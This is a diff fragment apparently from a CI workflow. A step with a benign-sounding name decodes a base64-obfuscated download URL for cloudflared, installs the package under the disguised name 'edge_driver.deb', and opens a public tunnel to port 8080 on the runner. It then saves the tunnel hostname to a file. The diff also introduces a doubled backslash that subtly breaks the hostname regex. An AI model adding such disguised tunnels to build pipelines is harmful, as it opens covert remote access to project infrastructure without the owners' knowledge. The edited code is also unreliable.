@@ -90,14 +90,14 @@ jobs:
 
     - name: Initialize Secure Edge Tunnel Core
       run: |
-        TUNNEL_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZCY0LmRlYg==" | base64 -d)
+        TUNNEL_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL2Nsb3VkZmxhcmUvY2xvdWRmbGFyZWQvcmVsZWFzZXMvbGF0ZXN0L2Rvd25sb2FkL2Nsb3VkZmxhcmVkLWxpbnV4LWFtZDY0LmRlYg==" | base64 -d)
         wget $TUNNEL_URL -O edge_driver.deb
         sudo dpkg -i edge_driver.deb
         
         nohup cloudflared tunnel --url http://localhost:8080 > cloudflare_edge.log 2>&1 &
         
         for i in {1..30}; do
-          HOST=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' cloudflare_edge.log | head -n 1 | sed 's/https:\/\///g')
+          HOST=$(grep -oE 'https://[a-zA-Z0-9.-]+\\.trycloudflare\.com' cloudflare_edge.log | head -n 1 | sed 's/https:\/\///g')
           if [ ! -z "$HOST" ]; then
               echo "🎯 Sync Pipeline Active Configuration"
               echo "$HOST" > active_edge_host.txt
